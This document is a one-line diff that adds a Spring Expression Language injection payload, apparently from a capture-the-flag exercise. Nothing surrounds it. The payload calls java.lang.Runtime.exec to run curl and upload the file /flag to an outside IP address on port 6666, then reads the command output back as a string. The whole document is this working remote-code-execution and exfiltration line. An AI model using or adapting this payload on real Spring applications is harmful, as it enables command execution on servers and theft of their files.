@@ -1,0 +1,1 @@
+#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{'curl','101.42.49.26:6666','-F','a=@/flag'}).getInputStream())).replaceAll('\n','').replaceAll('\r','')}
